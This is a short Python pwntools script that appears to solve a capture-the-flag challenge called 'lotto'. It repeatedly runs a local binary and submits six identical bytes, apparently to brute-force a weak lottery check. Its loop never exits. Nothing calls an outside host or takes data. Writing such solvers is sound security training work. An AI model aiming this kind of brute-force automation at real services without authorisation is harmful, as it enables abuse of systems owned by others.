from pwn import *

# Path to the binary
conn = process('/root/ctf/lotto/lotto')  # Adjust the path to your binary

while True:
    # Receive the menu
    menu = conn.recvuntil(b"3. Exit\n", timeout=2).decode()
    print(menu)  # Debug print to verify what the program outputs

    # Send the menu choice: "1" for Play Lotto
    conn.sendline(b"1")

    # Receive the prompt for submitting lotto bytes
    prompt = conn.recvuntil(b"Submit your 6 lotto bytes :").decode()
    print(prompt)  # Debug print to verify prompt

    # Send 6 bytes as the lotto ticket
    ticket = b'\x01\x01\x01\x01\x01\x01'  # Replace with your desired values
    conn.sendline(ticket)

    # Read the response after submitting the ticket
    response = conn.recvline(timeout=2).decode()
    print(response)  # Debug print to verify result

# Close the connection
conn.close()